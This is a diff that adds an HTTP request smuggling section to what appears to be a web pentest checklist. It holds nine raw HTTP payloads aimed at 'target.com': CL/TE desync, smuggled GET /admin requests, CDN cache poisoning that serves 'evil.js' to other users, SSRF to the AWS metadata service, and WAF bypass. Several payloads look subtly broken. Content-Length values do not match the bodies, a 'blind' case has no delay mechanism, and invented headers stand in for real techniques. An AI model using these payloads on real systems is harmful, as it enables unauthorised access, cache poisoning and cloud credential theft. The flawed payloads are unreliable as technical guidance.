@@ -6,6 +6,223 @@
 
 ### Black Box
 
+#### HRS With Content-Length And Transfer-Encoding
+
+{% stepper %}
+{% step %}
+Inject conflicting Content-Length and Transfer-Encoding headers to test for desync
+
+```http
+POST /api HTTP/1.1
+Host: target.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+GET /admin HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Check if the response indicates the backend processed the smuggled `GET /admin` request
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### HTTP/2 To HTTP/1.1 Downgrade
+
+{% stepper %}
+{% step %}
+If the site supports HTTP/2, force a downgrade to HTTP/1.1 with a smuggling payload
+
+```http
+POST /api HTTP/2
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+
+0
+GET /admin HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Verify if the backend executes the smuggled GET /admin request
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Multi-Chunked Smuggling
+
+{% stepper %}
+{% step %}
+Inject multiple Transfer-Encoding headers to confuse proxy parsing
+
+```http
+POST /api HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+
+0
+GET /admin HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Check if the smuggled request is processed by the backend
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Invalid TE Header Manipulation
+
+{% stepper %}
+{% step %}
+Use malformed Transfer-Encoding headers to bypass validation
+
+```http
+POST /api HTTP/1.1
+Host: vulnerable.com
+Transfer-Encoding: cHuNkEd
+Content-Length: 60
+
+0
+GET /admin HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Verify if the response includes evidence of the smuggled request
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Cache Poisoning With HRS
+
+{% stepper %}
+{% step %}
+Inject a payload to poison the CDN cache
+
+```http
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 60
+
+0
+GET /index.html HTTP/1.1
+X-Cache-Inject: evil.js
+```
+{% endstep %}
+
+{% step %}
+Check if the cache serves evil.js to subsequent users
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SSRF With HRS
+
+{% stepper %}
+{% step %}
+Smuggle a payload to access internal services
+
+```http
+POST /api HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 60
+
+0
+GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Verify if the response contains internal metadata (AWS metadata)
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### WAF Bypass With HRS
+
+{% stepper %}
+{% step %}
+Split payloads to evade WAF detection
+
+```http
+POST /api HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+X-Bypass: evasion
+
+0
+GET /secret HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Check if the smuggled request bypasses the WAF and reaches the backend
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Blind HRS
+
+{% stepper %}
+{% step %}
+Inject a time-delayed payload to detect blind smuggling
+
+```http
+POST /api HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 40
+
+0
+GET /admin HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Measure response delays to infer smuggling success
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Multi-Hop Proxy Smuggling
+
+{% stepper %}
+{% step %}
+Inject payloads across a chain of proxies (CDN → Load Balancer → Backend)
+
+```http
+POST /api HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 60
+
+0
+GET /admin HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Trace the smuggled request across each hop and check for discrepancies in processing
+{% endstep %}
+{% endstepper %}
+
+***
+
 #### Test Query String Pollution
 
 {% stepper %}
